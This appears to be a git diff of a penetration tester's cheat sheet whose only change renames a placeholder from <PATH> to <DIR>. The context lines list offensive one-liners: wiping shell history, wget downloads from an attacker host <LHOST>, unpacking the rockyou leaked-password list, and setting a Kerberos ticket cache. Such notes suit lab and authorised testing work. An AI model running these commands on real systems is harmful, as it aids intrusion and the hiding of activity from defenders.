@@ -23,10 +23,10 @@ history -c && history -w
 rm ~/.zsh_history
 
 # download wget
-wget http://<LHOST>/<PATH>
+wget http://<LHOST>/<DIR>
 
 # download wget rename
-wget http://<LHOST>/<PATH> -O <NEWFILE>
+wget http://<LHOST>/<DIR> -O <NEWFILE>
 
 # rockyou.txt
 sudo tar xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /usr/share/seclists/Passwords/Leaked-Databases/
@@ -35,8 +35,8 @@ sudo tar xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz 
 export KRB5CCNAME=/tmp/krb5cc_minenow
 
 # recursively find string in files
-grep -Horni <TEXT> <PATH> 
-grep -Hrni <TEXT> <PATH> 
+grep -Horni <TEXT> <DIR> 
+grep -Hrni <TEXT> <DIR> 
 
 # test reverse ping
 sudo tcpdump -i tun0 icmp
